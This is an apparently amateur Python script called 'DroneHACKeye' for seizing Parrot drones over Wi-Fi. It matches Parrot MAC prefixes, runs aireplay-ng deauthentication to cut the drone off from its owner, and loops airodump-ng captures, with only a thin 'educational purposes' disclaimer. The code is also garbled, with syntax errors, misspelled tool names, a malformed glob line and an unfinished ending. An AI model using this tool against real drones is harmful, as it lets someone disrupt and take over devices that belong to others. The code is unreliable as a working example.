import argparse
import glob
import os
import shlex
import subprocess
import sys
import time

from grpc import channel_ready_future

parser = argparse.ArgumentParser(description='DroneHACKeye main function')
parser.add_argument('wlan1', nargs='?', default='wlan1', metavar='wlan1', help='the wlan interface to put into monitor mode')
parser.add_argument('wlan2' , nargs='?', default='wlan2', metavar='wlan2' , help= 'the wlan interface to connect the drone wifi')


# using this script is not mean do any illegal activities . its for eductional purposes #
args = parser.parse_args()

# use this script on Linux Based OS #
parrot_macs = ['90.03.B7' , 'A0.14.3D' , '00.12.10' , '00.26.7E']

# intialize main variables #
wlan1 = args.wlan1
wlan2 = args.wlan2

dhclient = 'dhclient'
iwconfig = 'iwconfig'
ifconfig = 'ifconfig'
airmon = 'airmon-ng'
aireplay = 'airplay-ng'
aircrack = 'aircrack-ng'
airodump = 'airodump-ng'
nodejs = 'nodejs'

tmpfile = '/tmp/airodump'

# results will be prety awesome #
wifis = () # WLAN CHANNELS NEED TO GET SCANNED #
clients = () # BE ANNOYMOUS BABY TO CATCH USING FIREWALL #


def sudo(*args):
    command =- 'sudo'

    for arg in args:
        command += str(arg) + ''

        os.system(command)

def disconnect(aireplay, access_point, client, interface, channel_ready_future, channel1):
    print("Jumping into drone's channel " + str(channel_ready_future))
    sudo(iwconfig, wlan1, "channel", channel_ready_future)
    time.sleep(1)

    print("Disconnnecting the Drone from the owner")
    sudo(aireplay, '-0' , '3' , '-a', '-c' access_point, client, interface)
    print("Done Disconnecting Drone from the real owner")

    #print the stdr#
    def eprint(*args, **kwargs):
        print(*args, file=sys.stderr , **kwargs)
    
    while True:
        
        cmd = 'sudo' + airodump + '--output-format csv -w' + tmpfile + '' + wlan1
        with open('/dev/null') as null:
            process = subprocess.Popen(shlex.split(cmd) , stdout=null, stderr=null)


            pid = process.pid
            print('airodump pid :' + str(pid))


            time.sleep(3)
            sudo('kill' , pid)
            time.sleep(1)
            sudo('kill' , '-HUP' , pid)
            time.sleep(1)
            sudo('lillall' , '-9' , aireplay, airodump)


            for filename in glob.glob(tmpfile '+ csv')


            with open(filename) as file:
                for line in file:

                    sudo(ifconfig, wlan1 , 'dowm')
                    sudo(ifconfig , wlan2 'down')


                    #script is done ENJOY #